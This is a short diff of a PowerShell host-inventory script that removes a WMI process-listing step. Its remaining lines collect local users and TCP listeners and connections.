@@ -107,9 +107,6 @@ Foreach($WLANProfileName in $WLANProfileNames){
 # local-user
 $luser=Get-LocalUser
 
-# process first
-$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
-
 # Get Listeners / ActiveTcpConnections
 $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
 $listener = $listener | foreach-object {
